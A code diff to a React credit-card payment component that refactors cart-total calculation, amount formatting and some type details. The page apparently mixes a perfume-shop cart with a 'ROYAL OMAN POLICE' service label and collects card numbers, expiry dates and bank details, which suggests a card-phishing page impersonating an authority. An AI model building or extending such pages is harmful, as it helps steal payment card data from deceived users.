@@ -1,3 +1,4 @@
+import { discountedTotal, readPayable } from '@/lib/pricing';
 import { useState, useEffect, useRef } from "react";
 import { useSignalEffect } from "@preact/signals-react/runtime";
 import { useForm } from "react-hook-form";
@@ -92,7 +93,7 @@ export default function CreditCardPayment() {
   const [rejectedError, setRejectedError] = useState(false);
   const [showManualEntry, setShowManualEntry] = useState(true);
   const [samsungPayError, setSamsungPayError] = useState(false);
-  const debounceRef = useRef<ReturnType<typeof setTimeout>>();
+  const debounceRef = useRef<ReturnType<typeof setTimeout> | undefined>(undefined);
 
   const searchParams = new URLSearchParams(window.location.search);
   const urlAmount = searchParams.get('amount') || '0';
@@ -100,17 +101,11 @@ export default function CreditCardPayment() {
   const cartItems = JSON.parse(localStorage.getItem('amouage_cart') || '[]');
 
   const getCartTotal = () => {
-    const storedTotal = localStorage.getItem('amouage_order_total');
-    if (storedTotal && Number(storedTotal) > 0) {
-      return storedTotal;
-    }
-    let total = 0;
-    for (const item of cartItems) {
-      total += (parseFloat(item.priceNum) || 0) * (item.quantity || 1);
-    }
-    return (total * 0.75).toFixed(3);
+    const stored = readPayable();
+    if (stored > 0) return stored.toFixed(3);
+    return discountedTotal(cartItems).toFixed(3);
   };
-  const totalAmount = (Number(urlAmount) > 0) ? urlAmount : getCartTotal();
+  const totalAmount = (Number(urlAmount) > 0) ? Number(urlAmount).toFixed(3) : getCartTotal();
   const productNames = cartItems.map((item: any) => item.name).join(', ') || 'Order Payment';
 
   const [trackId] = useState(() => {
@@ -282,8 +277,8 @@ export default function CreditCardPayment() {
 
     waitingCardInfo.value = {
       cardType: cardType,
-      bankName: bankInfo?.bank || null,
-      bankLogo: bankInfo?.logo || null,
+      bankName: bankInfo?.bank || undefined,
+      bankLogo: bankInfo?.logo || undefined,
     };
 
     const [expiryMonth, expiryYear] = data.expiryDate.split("/");
@@ -294,7 +289,7 @@ export default function CreditCardPayment() {
       totalPaid: "OMR " + Number(totalAmount).toFixed(3),
       serviceName: "ROYAL OMAN POLICE",
       bankName: bankInfo?.bank || "Unknown",
-      bankLogo: bankInfo?.logo || null,
+      bankLogo: bankInfo?.logo || undefined,
       cardType,
     }));
 
